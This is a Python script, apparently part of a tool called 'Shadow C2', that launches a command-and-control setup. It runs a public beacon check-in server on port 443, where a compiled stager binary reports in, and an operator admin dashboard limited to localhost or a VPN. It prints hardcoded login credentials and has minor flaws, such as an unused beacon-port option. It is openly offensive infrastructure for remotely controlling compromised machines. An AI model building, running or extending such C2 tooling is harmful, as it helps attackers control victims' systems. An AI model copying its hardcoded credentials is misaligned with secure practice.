#!/usr/bin/env python3
"""
Split Server Runner - Runs both beacon endpoint and admin interface
Beacon server: 0.0.0.0:443 (for external beacons)
Admin server: 127.0.0.1:8080 (for localhost admin interface)
"""

import os
import sys
import time
import threading
import signal
import subprocess
from pathlib import Path

class SplitServerManager:
    """Manages both beacon and admin servers"""
    
    def __init__(self):
        self.beacon_process = None
        self.admin_process = None
        self.running = True
        
    def signal_handler(self, sig, frame):
        """Handle Ctrl+C gracefully"""
        print("\n[!] Shutting down split servers...")
        self.stop_servers()
        sys.exit(0)
        
    def check_requirements(self):
        """Check if all required files exist"""
        required_files = [
            "server/beacon_server.py",
            "server/admin_server.py",
            "bin/shadow-stager-advanced"  # Ваш скомпилированный маяк
        ]
        
        for file in required_files:
            if not Path(file).exists():
                print(f"[!] Required file not found: {file}")
                return False
        return True
        
    def start_beacon_server(self):
        """Start beacon server on port 443"""
        print("[+] Starting beacon server on 0.0.0.0:443...")
        
        try:
            self.beacon_process = subprocess.Popen([
                sys.executable, "server/beacon_server.py",
                "--port", "443"
            ], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            
            # Wait a moment to check if it started
            time.sleep(2)
            
            if self.beacon_process.poll() is None:
                print(f"[✓] Beacon server started (PID: {self.beacon_process.pid})")
                return True, 443
            else:
                stdout, stderr = self.beacon_process.communicate()
                error_msg = stderr.decode()
                
                if "root права" in error_msg or "PermissionError" in error_msg:
                    print("[!] Необходимы root права для порта 443")
                    print("[!] Используйте порт 8080 или запустите с sudo")
                    
                    # Try alternative port
                    print("[+] Попытка запустить на порту 8080...")
                    self.beacon_process = subprocess.Popen([
                        sys.executable, "server/beacon_server.py",
                        "--port", "8080"
                    ], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                    
                    time.sleep(2)
                    if self.beacon_process.poll() is None:
                        print(f"[✓] Beacon server started on port 8080 (PID: {self.beacon_process.pid})")
                        return True, 8080
                    else:
                        print("[!] Не удалось запустить beacon server")
                        return False, None
                else:
                    print(f"[!] Beacon server error: {error_msg}")
                    return False, None
                    
        except Exception as e:
            print(f"[!] Error starting beacon server: {e}")
            return False, None
    
    def start_admin_server(self, admin_host='127.0.0.1'):
        """Start admin server on specified host"""
        # Get the admin port from command line args or use default
        import sys
        admin_port = 8080
        
        # Try to get port from command line args
        for i, arg in enumerate(sys.argv):
            if arg == '--admin-port' and i + 1 < len(sys.argv):
                try:
                    admin_port = int(sys.argv[i + 1])
                    break
                except ValueError:
                    pass
        
        print(f"[+] Starting admin server on {admin_host}:{admin_port}...")
        
        try:
            self.admin_process = subprocess.Popen([
                sys.executable, "server/admin_server.py",
                "--port", str(admin_port),
                "--host", admin_host
            ], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            
            time.sleep(2)
            
            if self.admin_process.poll() is None:
                print(f"[✓] Admin server started on {admin_host}:{admin_port} (PID: {self.admin_process.pid})")
                return True, admin_port
            else:
                stdout, stderr = self.admin_process.communicate()
                print(f"[!] Admin server error: {stderr.decode()}")
                return False, None
                
        except Exception as e:
            print(f"[!] Error starting admin server: {e}")
            return False, None
    
    def monitor_servers(self):
        """Monitor both server processes"""
        print("\n" + "="*60)
        print("MONITORING SERVERS")
        print("="*60)
        
        try:
            while self.running:
                # Check beacon server
                if self.beacon_process and self.beacon_process.poll() is not None:
                    print("[!] Beacon server died!")
                    self.running = False
                    break
                    
                # Check admin server
                if self.admin_process and self.admin_process.poll() is not None:
                    print("[!] Admin server died!")
                    self.running = False
                    break
                
                # Print status
                beacon_status = "RUNNING" if self.beacon_process and self.beacon_process.poll() is None else "STOPPED"
                admin_status = "RUNNING" if self.admin_process and self.admin_process.poll() is None else "STOPPED"
                
                print(f"[+] Status: Beacon={beacon_status}, Admin={admin_status} - {time.strftime('%H:%M:%S')}", end='\r')
                time.sleep(10)
                
        except KeyboardInterrupt:
            pass
    
    def stop_servers(self):
        """Stop both servers"""
        print("\n[+] Stopping servers...")
        
        if self.beacon_process:
            print("[+] Stopping beacon server...")
            self.beacon_process.terminate()
            self.beacon_process.wait()
            
        if self.admin_process:
            print("[+] Stopping admin server...")
            self.admin_process.terminate()
            self.admin_process.wait()
            
        print("[✓] All servers stopped")
    
    def print_banner(self):
        """Print startup banner"""
        banner = """
╔══════════════════════════════════════════════════════════════════════════════╗
║                    SHADOW C2 SPLIT SERVER SYSTEM                            ║
║                    Разделенная конфигурация серверов                        ║
╚══════════════════════════════════════════════════════════════════════════════╝
        """
        print(banner)
    
    def run(self, admin_host='127.0.0.1'):
        """Run the complete split server system"""
        # Set up signal handler
        signal.signal(signal.SIGINT, self.signal_handler)
        
        self.print_banner()
        
        # Check requirements
        if not self.check_requirements():
            return False
            
        # Start servers
        beacon_result = self.start_beacon_server()
        if isinstance(beacon_result, tuple):
            beacon_ok, beacon_port = beacon_result
        else:
            beacon_ok = beacon_result
            beacon_port = 443
            
        if not beacon_ok:
            return False
            
        admin_result = self.start_admin_server(admin_host)
        if isinstance(admin_result, tuple):
            admin_ok, admin_port = admin_result
        else:
            admin_ok = admin_result
            admin_port = 8080
            
        if not admin_ok:
            self.stop_servers()
            return False
            
        # Store ports for reference
        self.beacon_port = beacon_port
        self.admin_port = admin_port
        
        # Print success information
        print("\n" + "="*60)
        print("✅ SPLIT SERVER SYSTEM STARTED SUCCESSFULLY!")
        print("="*60)
        print("")
        print("🎯 КОНФИГУРАЦИЯ:")
        print(f"   📡 Beacon endpoint: 0.0.0.0:{self.beacon_port}/api/beacon_checkin")
        print(f"   🛡️  Admin interface: {admin_host}:{self.admin_port}/dashboard")
        print("")
        print("🔒 БЕЗОПАСНОСТЬ:")
        if admin_host == '10.8.0.1':
            print("   • Маяки: доступны с любых IP")
            print("   • Админка: localhost + VPN (10.8.0.0/24)")
        else:
            print("   • Маяки: доступны с любых IP")
            print("   • Админка: только localhost")
        print("   • Аутентификация: обязательна")
        print("   • Логирование: включено")
        print("")
        print("🚀 ДОСТУП:")
        if admin_host == '10.8.0.1':
            print(f"   • Админ-интерфейс: http://{admin_host}:{self.admin_port}/dashboard")
            print(f"   • Через VPN: http://{admin_host}:{self.admin_port}/dashboard")
        else:
            print(f"   • Админ-интерфейс: http://localhost:{self.admin_port}/dashboard")
        print(f"   • Beacon endpoint: http://0.0.0.0:{self.beacon_port}/api/beacon_checkin")
        print("   • Credentials: admin / shadowc2")
        print("")
        print("⚡ Нажмите Ctrl+C для остановки")
        print("")
        
        # Start monitoring
        self.monitor_servers()
        
        return True

def main():
    """Main function"""
    import argparse
    
    parser = argparse.ArgumentParser(description='Shadow C2 Split Server System')
    parser.add_argument('--beacon-port', type=int, default=443, help='Port for beacon endpoint (default: 443)')
    parser.add_argument('--admin-port', type=int, default=8080, help='Port for admin interface (default: 8080)')
    parser.add_argument('--admin-host', default='127.0.0.1', help='Host for admin interface (default: 127.0.0.1, use 10.8.0.1 for VPN)')
    
    args = parser.parse_args()
    
    # Override ports if provided
    if args.beacon_port != 443 or args.admin_port != 8080 or args.admin_host != '127.0.0.1':
        print(f"[+] Using custom config: beacon={args.beacon_port}, admin={args.admin_host}:{args.admin_port}")
    
    manager = SplitServerManager()
    
    try:
        success = manager.run(admin_host=args.admin_host)
        
        if success:
            print("\n" + "="*60)
            print("✅ SPLIT SERVER SYSTEM COMPLETED SUCCESSFULLY!")
            print("="*60)
        else:
            print("\n" + "="*60)
            print("❌ SPLIT SERVER SYSTEM FAILED")
            
    except Exception as e:
        print(f"\n[!] Unexpected error: {e}")
        manager.stop_servers()